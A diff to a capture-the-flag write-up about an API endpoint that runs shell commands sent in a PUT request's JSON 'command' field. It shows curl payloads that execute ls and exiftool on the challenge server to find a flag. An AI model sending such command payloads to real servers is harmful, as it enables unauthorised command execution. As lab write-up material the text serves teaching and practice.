@@ -57,7 +57,7 @@ In this challenge we are given a **GET** endpoint to an **API** that sounds like
 - This statement is hinting us that maybe another `HTTP` request method might not be handled securely.
 We try a `PUT` request wit the payload:
 ```bash
-curl -X PUT http://127.0.0.1:5000/send-command \
+curl -X PUT http://<Server_IP>:5000/send-command \
 -H "Content-Type: application/json" \
 -d '{"command":"ls"}'
 ```
@@ -68,7 +68,7 @@ curl -X PUT http://127.0.0.1:5000/send-command \
 - We know that there is an image called `flag.jpg` so maybe our flag is there and perhaps this is some sort of *remote-stegano* challenge.
 - We send the payload:
 ```bash
-curl -X PUT http://127.0.0.1:5000/send-command
+curl -X PUT http://<Server_IP>:5000/send-command
 -H "Content-Type: application/json" 
 -d '{"command":"exiftool flag.jpg | grep CYBERTM"}'
 ```
